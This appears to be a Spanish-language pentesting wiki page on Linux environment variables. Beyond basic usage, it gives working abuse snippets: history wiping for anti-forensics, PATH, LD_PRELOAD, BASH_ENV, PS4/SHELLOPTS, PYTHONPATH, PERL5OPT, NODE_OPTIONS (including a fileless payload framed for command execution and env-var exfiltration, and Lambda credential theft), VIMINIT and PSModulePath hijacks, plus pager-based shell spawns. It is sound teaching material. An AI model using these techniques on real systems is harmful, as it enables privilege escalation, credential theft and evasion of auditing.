# Variables de entorno de Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Las variables globales **serán** heredadas por los **procesos secundarios**.

Puedes crear una variable global para tu sesión actual de la siguiente manera:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Esta variable estará accesible para tus sesiones actuales y sus procesos secundarios.

Puedes **eliminar** una variable haciendo:

```bash
unset MYGLOBAL
```

## Variables locales

Las **variables locales** solo pueden ser **accedidas** por el **shell/script actual**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Listar las variables actuales

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

El contenido de `/proc/*/environ` está **separado por NUL**, así que estas variantes suelen ser más fáciles de leer:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Si buscas **credenciales** o **configuración interesante de servicios** en entornos heredados, consulta también [Linux Post Exploitation](../post-exploitation/README.md).

## Variables comunes

De: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – la pantalla utilizada por **X**. Esta variable suele establecerse en **:0.0**, lo que significa la primera pantalla del equipo actual.
- **EDITOR** – el editor de texto preferido del usuario.
- **HISTFILESIZE** – el número máximo de líneas que contiene el archivo de historial.
- **HISTSIZE** – número de líneas que se añaden al archivo de historial cuando el usuario termina su sesión.
- **HOME** – tu directorio personal.
- **HOSTNAME** – el nombre de host del equipo.
- **LANG** – tu idioma actual.
- **MAIL** – la ubicación del spool de correo del usuario. Normalmente, **/var/spool/mail/USER**.
- **MANPATH** – la lista de directorios en los que se buscan las páginas del manual.
- **OSTYPE** – el tipo de sistema operativo.
- **PS1** – el prompt predeterminado de bash.
- **PATH** – almacena las rutas de todos los directorios que contienen archivos binarios que quieres ejecutar con solo especificar el nombre del archivo, sin usar una ruta relativa o absoluta.
- **PWD** – el directorio de trabajo actual.
- **SHELL** – la ruta al shell de comandos actual (por ejemplo, **/bin/bash**).
- **TERM** – el tipo de terminal actual (por ejemplo, **xterm**).
- **TZ** – tu zona horaria.
- **USER** – tu nombre de usuario actual.

## Variables interesantes para hacking

No todas las variables son igual de útiles. Desde una perspectiva ofensiva, prioriza las variables que cambian las **rutas de búsqueda**, los **archivos de inicio**, el **comportamiento del enlazador dinámico** o la **auditoría y el registro**.

### **HISTFILESIZE**

Cambia el **valor de esta variable a 0** para que, cuando **termines tu sesión**, el **archivo de historial** (\~/.bash_history) se **trunque a 0 líneas**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Cambia el **valor de esta variable a 0** para que los comandos **no se guarden en el historial en memoria** ni se escriban en el **archivo del historial** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Si **el valor de esta variable está establecido en `ignorespace` o `ignoreboth`**, cualquier comando precedido por un espacio adicional no se guardará en el historial.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Apunta el **archivo de historial** a **`/dev/null`** o desconfigúralo por completo. Esto suele ser más fiable que cambiar solo el tamaño del historial.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Los procesos usarán el **proxy** declarado aquí para conectarse a Internet mediante **http o https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: proxy predeterminado para las herramientas y protocolos que lo admiten.
- `no_proxy`: lista de exclusión (hosts/dominios/CIDR) que deben conectarse directamente.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Pueden usarse las variantes en minúsculas o mayúsculas, según la herramienta (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Los procesos confiarán en los certificados indicados en **estas variables de entorno**. Esto resulta útil para hacer que herramientas como **`curl`**, **`git`**, clientes HTTP de Python o gestores de paquetes confíen en una CA controlada por el atacante (por ejemplo, para que un proxy de interceptación parezca legítimo).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Si un wrapper/script con privilegios ejecuta comandos **sin rutas absolutas**, gana el **primer directorio controlado por el atacante** en `PATH`. Este es el mecanismo detrás de muchos **secuestros de PATH** en `sudo`, tareas de cron, wrappers de shell y helpers SUID personalizados. Busca `env_keep+=PATH`, un `secure_path` débil o wrappers que llamen a `tar`, `service`, `cp`, `python`, etc. por nombre.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Para ver cadenas completas de escalada de privilegios que abusan de `PATH`, consulta [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` no es solo una referencia a un directorio: muchas herramientas cargan automáticamente **dotfiles**, **plugins** y **configuración por usuario** desde `$HOME` o `$XDG_CONFIG_HOME`. Si un flujo de trabajo con privilegios conserva estos valores, la **config injection** puede ser más fácil que el secuestro de binarios.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Los objetivos interesantes incluyen `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` y archivos específicos de herramientas como `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Estas variables influyen en el **enlazador dinámico**:

- `LD_PRELOAD`: fuerza la carga anticipada de objetos compartidos adicionales.
- `LD_LIBRARY_PATH`: antepone directorios a las rutas de búsqueda de bibliotecas.
- `LD_AUDIT`: carga bibliotecas auditoras que observan la carga de bibliotecas y la resolución de símbolos.

Son muy valiosas para **hooking**, **instrumentación** y **escalada de privilegios** si un comando privilegiado las conserva. En modo de **ejecución segura** (`AT_SECURE`, por ejemplo, setuid/setgid/capabilities), el cargador elimina o restringe muchas de estas variables. Sin embargo, los errores del parser en esa etapa inicial del cargador siguen teniendo un gran impacto porque se ejecutan **antes que el programa objetivo**.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` cambia el comportamiento inicial de glibc (por ejemplo, los parámetros ajustables del asignador de memoria) y es muy útil en laboratorios de exploits. También es importante desde el punto de vista de la seguridad porque el **cargador dinámico la analiza muy pronto**. El bug **Looney Tunables** de 2023 fue un buen recordatorio de que una sola variable de entorno analizada por el cargador puede convertirse en una **primitiva local de escalada de privilegios** contra programas SUID.<sup>[[6]](#references)</sup>

Para CVE-2023-4911, compara la **versión instalada del paquete de la distribución** con la versión corregida del proveedor y verifica qué cargador se usa realmente para los procesos nuevos. Una cadena de versión upstream, por sí sola, no es fiable: Debian incluyó en su paquete 2.31 el analizador vulnerable, mientras que otras distribuciones incluyeron correcciones sin cambiar el número upstream. Para que se produzca una transición de privilegios, también hace falta un ejecutable privilegiado cuyo cambio de identidad no esté bloqueado por `NoNewPrivs`, un montaje `nosuid` u otra mitigación. Evita ejecutar una prueba de fallo con un `GLIBC_TUNABLES` malformado durante la enumeración pasiva. Consulta el [rastreador de Ubuntu](https://ubuntu.com/security/CVE-2023-4911), el [rastreador de Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) y el [aviso de Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) para conocer la aplicabilidad según la versión; el [aviso de seguridad](https://ubuntu.com/security/notices/USN-6409-1) de Ubuntu también indica que hay que reiniciar después de actualizar.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Si **Bash** se inicia **de forma no interactiva**, comprueba `BASH_ENV` y carga ese archivo antes de ejecutar el script de destino. Cuando Bash se invoca como `sh` o en modo interactivo al estilo POSIX, también puede consultar `ENV`. Esta es una forma clásica de convertir un wrapper de shell en ejecución de código si el entorno está controlado por un atacante.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignora estos archivos de inicio cuando los **ID reales y efectivos son distintos**; `-p` conserva el ID efectivo, pero no habilita esos archivos de inicio, así que el comportamiento exacto depende de cómo el wrapper invoque el shell. Ten cuidado con los wrappers privilegiados que llaman a `setuid()`/`setgid()` **antes** de lanzar Bash: cuando los ID vuelven a coincidir, Bash puede confiar en `BASH_ENV`, `ENV` y el estado relacionado del shell, que de otro modo ignoraría.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Cuando Bash se ejecuta con **xtrace** habilitado, expande `PS4` y lo imprime antes de cada comando que rastrea. `PS4` se expande como un prompt, por lo que se ejecuta cualquier **sustitución de comandos** que contenga. Y lo que es crucial: xtrace se puede habilitar directamente desde el entorno exportando `SHELLOPTS=xtrace`; no hace falta usar `-x` en la línea de comandos. Así, cualquier script de Bash que ejecute la víctima se convierte en ejecución de código.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` no hace nada hasta que xtrace está activo (`SHELLOPTS=xtrace`, `set -x` o `bash -x`), y Bash descarta `SHELLOPTS` en contextos privilegiados/setuid, igual que `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Estas variables cambian la forma en que se inicia Python:

- `PYTHONPATH`: antepone rutas de búsqueda de importación.
- `PYTHONHOME`: reubica el árbol de la biblioteca estándar.
- `PYTHONSTARTUP`: ejecuta un archivo antes del prompt interactivo.
- `PYTHONINSPECT=1`: entra en modo interactivo cuando termina un script.
- `PYTHONBREAKPOINT`: se invoca `package.module.callable` (y se importa su módulo) cuando el código llega a `breakpoint()`.<sup>[[8]](#references)</sup>

Son útiles frente a scripts de mantenimiento, depuradores, shells y wrappers que ejecutan Python con un entorno controlable. `python -E` y `python -I` ignoran todas las variables `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Un ejemplo reciente del mundo real fue la vulnerabilidad LPE de **needrestart** de 2024 en sistemas Ubuntu/Debian: el escáner propiedad de root copió el `PYTHONPATH` de un proceso sin privilegios desde `/proc/<PID>/environ` y luego ejecutó Python. El exploit publicado colocó `importlib/__init__.so` en la ruta controlada por el atacante para que Python ejecutara código del atacante durante su propia inicialización, antes incluso de que importara el script codificado de forma fija en el helper.<sup>[[3]](#references)</sup>

### **PERL5OPT y PERL5LIB**

Perl tiene variables de inicio igual de útiles:

- `PERL5LIB`: antepone directorios de bibliotecas.
- `PERL5OPT`: inyecta opciones como si estuvieran en la línea de comandos de cada invocación de `perl`.

Esto puede forzar la **carga automática de módulos** o cambiar el comportamiento del intérprete antes de que el script objetivo haga algo interesante. Perl ignora estas variables en contextos de **taint / setuid / setgid**, pero siguen siendo muy relevantes para wrappers normales ejecutados como root, trabajos de CI, instaladores y reglas personalizadas de sudoers.

Si una regla de sudo permite sobrescribir el entorno y el comando privilegiado acaba ejecutando Perl, revisa también `PERL5DB`. La documentación de Perl indica que `PERL5OPT=-d` inicia el debugger y que `PERL5DB` proporciona código de inicialización del debugger cuando Perl se inicia con una opción `-d` sin argumentos. Quitar solo `PERL5LIB` y `PERLLIB` no elimina esta vía. Las variables deben conservarse a través de sudo y del wrapper, y el proceso de Perl no debe ignorarlas por el manejo de taint o de ID de conjunto; inspecciona la regla exacta y la cadena de ejecución sin ejecutar el helper privilegiado durante la enumeración. Consulta la [referencia de variables de entorno de perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

La ruta de búsqueda integrada de Perl, [`@INC`](https://perldoc.perl.org/perlvar#@INC), es otro límite de confianza para los módulos, incluso si no se conservan variables de entorno. En un proceso de Perl privilegiado, relaciona una instrucción `use` o `require` concreta con el nombre de módulo resuelto, el orden de búsqueda y la capacidad de un usuario con menos privilegios para crear o reemplazar ese módulo en un directorio de búsqueda. Que un directorio de bibliotecas permita escritura no demuestra por sí solo que el proceso privilegiado cargará código desde allí.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` antepone **flags de CLI de Node.js** a cada proceso de `node` que hereda el entorno. Esto lo hace útil contra wrappers, trabajos de CI, helpers de Electron y reglas de sudo que finalmente ejecutan Node. Los flags más interesantes desde una perspectiva ofensiva suelen ser:

- `--require <file>`: carga previamente un archivo CommonJS antes del script objetivo.
- `--import <module>`: carga previamente un módulo ES antes del script objetivo.

Node rechaza algunos flags peligrosos en `NODE_OPTIONS`, pero `--require` y `--import` están explícitamente permitidos y se procesan **antes** de los argumentos normales de la línea de comandos.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Preload sin archivos con una URL `data:`

Cuando puedes configurar `NODE_OPTIONS` pero **no puedes escribir un archivo** en el objetivo (sistema de archivos de solo lectura, API restringida, entorno serverless, etc.), `--import` acepta una URL `data:text/javascript,`, por lo que toda la carga útil se incluye en la propia variable de entorno. El JavaScript debe estar **codificado completamente para URL**: Node interpreta el valor como una URL, así que cualquier espacio sin codificar (u otro carácter sin codificar) trunca la carga útil y provoca un `SyntaxError`. Esto funciona en Node 20.6+, donde `--import` está en la lista de permitidos de `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Esta es una forma común de convertir el control de `NODE_OPTIONS` en RCE en **runtimes de cloud administrados** cuyas funciones ejecutan Node. Por ejemplo, un atacante que solo puede cambiar la configuración de una Lambda (`lambda:UpdateFunctionConfiguration`, sin `iam:PassRole` ni actualización de código) puede inyectar `NODE_OPTIONS=--import data:text/javascript,<payload>` para ejecutar código dentro de la función y robar las credenciales de su rol de ejecución. El módulo inyectado se ejecuta **antes** que el handler, que después sigue ejecutándose normalmente.

Para las cadenas de gadgets remotas que configuran `NODE_OPTIONS` indirectamente (por ejemplo, de prototype pollution a RCE), consulta [esta otra página](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby ofrece el mismo tipo de abuso durante el inicio:

- `RUBYLIB`: antepone directorios a la ruta de carga de Ruby.
- `RUBYOPT`: inyecta opciones de línea de comandos, como `-r`, en cada invocación de `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Las vulnerabilidades de **needrestart** de 2024 demostraron que esto no es solo un truco de laboratorio: el mismo helper propiedad de root que era vulnerable al abuso de `PYTHONPATH` también podía ser manipulado para ejecutar Ruby con un `RUBYLIB` controlado por un atacante y cargar `enc/encdb.so` desde un directorio del atacante.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim ejecutan los comandos Ex incluidos en `VIMINIT` (o en su alternativa `EXINIT`) durante un inicio normal. Los comandos Ex incluyen `:!cmd` y `:call system(...)`, así que controlar la variable permite ejecutar código cada vez que una víctima abre Vim (un `sudo vim` como root, `crontab -e`, `visudo`, `git`/`less` al ejecutar `$EDITOR`, etc.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

El modo Batch (`vim -es`/`-Es`) omite estas variables, pero un inicio interactivo normal sí las ejecuta.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS y CLR profiler**

PowerShell Core (`pwsh`) se ejecuta en Linux/macOS (y Windows) y es una **aplicación .NET**, por lo que varias variables de entorno convierten cualquier invocación de `pwsh` con un entorno heredado en code execution; esto es útil contra trabajos de cron/systemd, ejecutores de CI y wrappers con privilegios que invocan `pwsh`.

- `PSModulePath`: PowerShell busca recursivamente en todos los directorios de esta lista módulos `.psd1`/`.psm1` y **los carga automáticamente** la primera vez que se hace referencia a un comando que exportan. Añade un directorio al principio de la lista y el código de nivel superior de tu módulo se ejecuta al importarlo; como la resolución sigue el orden *Alias → Function → Cmdlet*, una función exportada puede incluso ocultar un cmdlet integrado que invoque la víctima.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: reubica `powershell/Microsoft.PowerShell_profile.ps1`, que se ejecuta al inicio (salvo que se use `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: ensamblado administrado cuyo `StartupHook.Initialize()` se ejecuta antes de `Main` (compartido por todas las aplicaciones .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: la API de profiling de CLR carga una biblioteca del atacante en el proceso al inicio (las variables de ruta tienen prioridad sobre el registro; `DOTNET_*` es el alias más reciente). En Windows PowerShell 5.1 (.NET Framework), usa `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

En Windows, `PSExecutionPolicyPreference=Bypass` también elimina la protección que bloquea los «unsigned scripts», de modo que un perfil/módulo plantado realmente se ejecuta. Consulta la página dedicada para ver los PoC completos:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Algunas herramientas no solo leen una ruta del entorno, sino que pasan el valor a un **shell**, un **editor** o un **preprocesador de entrada**. Esto hace que las siguientes variables sean especialmente interesantes cuando un wrapper privilegiado ejecuta `git`, `man`, `less` o visores de texto similares:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: eligen el comando del pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: eligen el comando del editor, a menudo con argumentos.
- `LESSOPEN`, `LESSCLOSE`: definen preprocesadores y posprocesadores que se ejecutan cuando `less` abre un archivo.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git también admite la **inyección de configuración solo mediante el entorno** sin tocar el disco, mediante `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` y `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Desde una perspectiva de post-exploitation, recuerda también que los entornos heredados suelen contener **credenciales**, **configuración de proxy**, **tokens de servicio** o **claves de nube**. Consulta [Linux Post Exploitation](../post-exploitation/README.md) para buscar en `/proc/<PID>/environ` y en `Environment=` de `systemd`.

### PS1

Cambia el aspecto del prompt.

[**Este es un ejemplo**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Este es un ejemplo](<../images/image (897).png>)

Usuario normal:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos en segundo plano](<../images/image (740).png>)

Uno, dos y tres trabajos en segundo plano:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos en segundo plano](<../images/image (145).png>)

Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente:

![PERL5OPT & PERL5LIB - PS1: Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente](<../images/image (715).png>)

## References

- [1] [Manual de GNU Bash - Archivos de inicio de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs en needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentación de Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables de entorno comunes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - escalada de privilegios local en ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manual de GNU Bash - Variables de Bash (`PS4`) y el comando Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() integrado y PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentación de Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath y carga automática de módulos de PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Configuración de depuración y generación de perfiles de .NET (variables de perfilador `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
